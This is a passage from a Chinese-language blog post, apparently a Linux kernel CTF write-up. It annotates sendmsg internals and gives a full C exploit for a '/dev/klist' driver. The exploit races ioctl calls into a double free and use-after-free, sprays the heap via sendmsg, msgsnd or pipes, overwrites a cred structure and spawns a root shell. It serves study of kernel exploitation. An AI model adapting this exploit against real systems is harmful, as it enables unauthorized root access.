&#123;</span><span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> sockfd = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);</span><br><span class="line">addr.sin_family = AF_INET;</span><br><span class="line">addr.sin_port = htons(<span class="number">6666</span>);</span><br><span class="line"></span><br><span class="line">msg.msg_control = buff;</span><br><span class="line">msg.msg_controllen = BUFF_SIZE; </span><br><span class="line">msg.msg_name = (<span class="keyword">caddr_t</span>)&amp;addr;</span><br><span class="line">msg.msg_namelen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">  sendmsg(sockfd, &amp;msg, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,</span><br><span class="line">             struct msghdr *msg_sys, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags,</span><br><span class="line">             struct used_address *used_address,</span><br><span class="line">             <span class="keyword">unsigned</span> <span class="keyword">int</span> allowed_msghdr_flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *<span class="title">msg_compat</span> =</span></span><br><span class="line"><span class="class">        (<span class="title">struct</span> <span class="title">compat_msghdr</span> __<span class="title">user</span> *)<span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">address</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iovstack</span>[<span class="title">UIO_FASTIOV</span>], *<span class="title">iov</span> = <span class="title">iovstack</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> ctl[<span class="keyword">sizeof</span>(struct cmsghdr) + <span class="number">20</span>]</span><br><span class="line">                __aligned(<span class="keyword">sizeof</span>(<span class="keyword">__kernel_size_t</span>)); <span class="comment">// 创建44字节的栈缓冲区ctl，20是ipv6_pktinfo结构的大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *ctl_buf = ctl; <span class="comment">// ctl_buf指向栈缓冲区ctl</span></span><br><span class="line">    <span class="keyword">int</span> ctl_len;</span><br><span class="line">    <span class="keyword">ssize_t</span> err;</span><br><span class="line"></span><br><span class="line">    msg_sys-&gt;msg_name = &amp;address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (MSG_CMSG_COMPAT &amp; flags)</span><br><span class="line">        err = get_compat_msghdr(msg_sys, msg_compat, <span class="literal">NULL</span>, &amp;iov);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        err = copy_msghdr_from_user(msg_sys, msg, <span class="literal">NULL</span>, &amp;iov); <span class="comment">// 用户数据拷贝到msg_sys，只拷贝msghdr消息头部</span></span><br><span class="line">    <span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">    err = -ENOBUFS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msg_sys-&gt;msg_controllen &gt; INT_MAX) <span class="comment">//如果msg_sys小于INT_MAX，就把ctl_len赋值为用户提供的msg_controllen</span></span><br><span class="line">        <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">    flags |= (msg_sys-&gt;msg_flags &amp; allowed_msghdr_flags);</span><br><span class="line">    ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    <span class="keyword">if</span> ((MSG_CMSG_COMPAT &amp; flags) &amp;&amp; ctl_len) &#123;</span><br><span class="line">        err =</span><br><span class="line">            cmsghdr_from_user_compat_to_kern(msg_sys, sock-&gt;sk, ctl,</span><br><span class="line">                             <span class="keyword">sizeof</span>(ctl));</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        ctl_buf = msg_sys-&gt;msg_control;</span><br><span class="line">        ctl_len = msg_sys-&gt;msg_controllen;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl_len) &#123;</span><br><span class="line">        BUILD_BUG_ON(<span class="keyword">sizeof</span>(struct cmsghdr) !=</span><br><span class="line">                 CMSG_ALIGN(<span class="keyword">sizeof</span>(struct cmsghdr)));</span><br><span class="line">        <span class="keyword">if</span> (ctl_len &gt; <span class="keyword">sizeof</span>(ctl)) &#123;  <span class="comment">//注意用户数据的size必须大于44字节</span></span><br><span class="line">            ctl_buf = sock_kmalloc(sock-&gt;sk, ctl_len, GFP_KERNEL);<span class="comment">//sock_kmalloc最后会调用kmalloc 分配 ctl_len 大小的堆块</span></span><br><span class="line">            <span class="keyword">if</span> (ctl_buf == <span class="literal">NULL</span>)</span><br><span class="line">                <span class="keyword">goto</span> out_freeiov;</span><br><span class="line">        &#125;</span><br><span class="line">        err = -EFAULT;</span><br><span class="line">        <span class="comment">/* 注意，msg_sys-&gt;msg_control是用户可控的用户缓冲区；ctl_len是用户可控的长度。  用户数据拷贝到ctl_buf内核空间。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(ctl_buf,</span><br><span class="line">                   (<span class="keyword">void</span> __user __force *)msg_sys-&gt;msg_control,</span><br><span class="line">                   ctl_len))</span><br><span class="line">            <span class="keyword">goto</span> out_freectl;</span><br><span class="line">        msg_sys-&gt;msg_control = ctl_buf;</span><br><span class="line">    &#125;</span><br><span class="line">    msg_sys-&gt;msg_flags = flags;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms | grep sock_kmalloc</span><br></pre></td></tr></table></figure>
<h2 id="exp：-25"><a href="#exp：-25" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -static -pthread xx.c -g -o xx</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SELECT 0x1338</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE 0x1339</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GET_HEAD 0x133A</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mystruct</span>&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* myptr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mystruct</span>* <span class="title">global_ptr</span>;</span></span><br><span class="line"><span class="keyword">char</span>* ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[:)]Root now!!!"</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="comment">//char* args[2] = &#123;"/bin/sh", NULL&#125;;</span></span><br><span class="line">            <span class="comment">//execv("/bin/sh", args);</span></span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> choice = <span class="number">3</span>;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0L</span>L,<span class="number">2</span>,<span class="number">0L</span>L);</span><br><span class="line">    fd = open(<span class="string">"/dev/klist"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]open error..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    global_ptr = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">char</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span>* buf1 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span>* buf2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span>* buf7 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    memset(buf,'\x11',0x1000);</span><br><span class="line">    memset(buf1,'\x11',0x1000);</span><br><span class="line">    memset(buf2,'\x22',0x1000);</span><br><span class="line">    memset(buf7,'\x77',0x1000);</span><br><span class="line">    global_ptr-&gt;size = <span class="number">0x280</span><span class="number">-0x18</span>;</span><br><span class="line">    global_ptr-&gt;myptr = buf1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">200</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">            check_root();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ioctl(fd,ADD,global_ptr);</span><br><span class="line">    ioctl(fd,SELECT,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            global_ptr-&gt;myptr = buf1;</span><br><span class="line">            ioctl(fd,ADD,global_ptr); <span class="comment">//success -&gt; flag = 0 &amp; first free </span></span><br><span class="line">            ioctl(fd,SELECT,<span class="number">0</span>);       <span class="comment">//success -&gt; flag = 1</span></span><br><span class="line">            ioctl(fd,REMOVE,<span class="number">0</span>);       <span class="comment">//success -&gt; flag = 0 &amp; double free</span></span><br><span class="line"></span><br><span class="line">            global_ptr-&gt;myptr = buf2;</span><br><span class="line">            ioctl(fd,ADD,global_ptr); <span class="comment">//test UAF set flag = 1</span></span><br><span class="line">            read(fd,buf,<span class="number">0x8</span>);</span><br><span class="line">            if(buf[0] != '\x11')&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"[:)]Race success 1"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ioctl(fd,REMOVE,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">0.5</span>);</span><br><span class="line">        ioctl(fd,REMOVE,<span class="number">0</span>); <span class="comment">//success -&gt; free into anthor slab ?</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">            pipe(&amp;fds[<span class="number">0</span>]);            <span class="comment">//get UAF chunk   </span></span><br><span class="line">            write(fds[<span class="number">1</span>],buf7,<span class="number">0x280</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">            struct&#123;</span><br><span class="line">                <span class="keyword">long</span> mtype;</span><br><span class="line">                <span class="keyword">char</span> mtext[<span class="number">0x280</span><span class="number">-0x30</span>];</span><br><span class="line">            &#125;msg;</span><br><span class="line">            <span class="built_in">memset</span>(msg.mtext,<span class="number">0x42</span>,<span class="number">0x280</span><span class="number">-0x30</span><span class="number">-1</span>);</span><br><span class="line">            msg.mtext[<span class="number">0x280</span><span class="number">-0x30</span>] = <span class="number">0</span>;</span><br><span class="line">            msg.mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> msqid = msgget(IPC_PRIVATE,<span class="number">0644</span>|IPC_CREAT);</span><br><span class="line">            msgsnd(msqid,&amp;msg,<span class="keyword">sizeof</span>(msg.mtext),<span class="number">0</span>); <span class="comment">//get UAF chunk </span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">char</span> buff[<span class="number">0x280</span>];</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msg</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span> = &#123;</span><span class="number">0</span>&#125;;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">int</span> sockfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>);</span><br><span class="line">            addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);</span><br><span class="line">            addr.sin_family = AF_INET;</span><br><span class="line">            addr.sin_port = htons(<span class="number">6666</span>);</span><br><span class="line"></span><br><span class="line">            msg.msg_control = buff;</span><br><span class="line">            msg.msg_controllen = <span class="number">0x280</span>; </span><br><span class="line">            msg.msg_name = (<span class="keyword">caddr_t</span>)&amp;addr;</span><br><span class="line">            msg.msg_namelen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line"></span><br><span class="line">            sendmsg(sockfd,&amp;msg,<span class="number">0</span>);     <span class="comment">//get UAF chunk</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span>* user_buf = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x1000000</span>);</span><br><span class="line">        read(fd,user_buf,<span class="number">0x1000000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x1000000</span>/<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(user_buf[i+<span class="number">0</span>] == <span class="number">0x3e8</span> &amp;&amp; user_buf[i+<span class="number">1</span>] == <span class="number">0x3e8</span> </span><br><span class="line">            &amp;&amp; user_buf[i+<span class="number">2</span>] == <span class="number">0x3e8</span> &amp;&amp; user_buf[i+<span class="number">3</span>] == <span class="number">0x3e8</span> </span><br><span class="line">            &amp;&amp; user_buf[i+<span class="number">4</span>] == <span class="number">0x3e8</span> &amp;&amp; user_buf[i+<span class="number">5</span>] == <span class="number">0x3e8</span>  </span><br><span class="line">            &amp;&amp; user_buf[i+<span class="number">6</span>] == <span class="number">0x3e8</span> &amp;&amp; user_buf[i+<span class="number">7</span>] == <span class="number">0x3e8</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"[:)]find cred!!!"</span>);</span><br><span class="line">                user_buf[i<span class="number">-1</span>] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i+<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i+<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i+<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i+<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i+<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i+<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">                user_buf[i+<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">                write(fd,user_buf,<span class="number">4</span>*(i+<span class="number">8</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        check_root();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            ioctl(fd,GET_HEAD,buf);</span><br><span class="line">            read(fd,buf,<span class="number">0x8</span>);</span><br><span class="line">            if(buf[0] != '\x11')&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">"[:)]Race success 2"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        check_root();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">RAX: 0xffff88007a056e40 --&gt; 0x3e800000002 </span></span><br><span class="line"><span class="comment">RBX: 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RCX: 0x1 </span></span><br><span class="line"><span class="comment">RDX: 0x88 </span></span><br><span class="line"><span class="comment">RSI: 0x15080c0 </span></span><br><span class="line"><span class="comment">RDI: 0xffff88007cc01800 --&gt; 0x23b20 </span></span><br><span class="line"><span class="comment">RBP: 0xffffc90000b8fed8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RSP: 0xffffc90000b8fe70 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">RIP: 0xffffffff811a37da --&gt; 0xc08548fffe5091e8 </span></span><br><span class="line"><span class="comment">R8 : 0xffff88007f624ae0 --&gt; 0xffff88007b354618 --&gt; 0xffff88007b354640 --&gt; 0xffff88007b354668 --&gt; 0xffff88007b354690 --&gt; 0xffff88007b3546b8 (--&gt; ...)</span></span><br><span class="line"><span class="comment">R9 : 0x0 </span></span><br><span class="line"><span class="comment">R10: 0xffff88007b3545f0 --&gt; 0xffff88007b9f4ff8 --&gt; 0x0 </span></span><br><span class="line"><span class="comment">R11: 0x0 </span></span><br><span class="line"><span class="comment">R12: 0xffff88007c598c00 --&gt; 0xcb000000ce </span></span><br><span class="line"><span class="comment">R13: 0x100000 </span></span><br><span 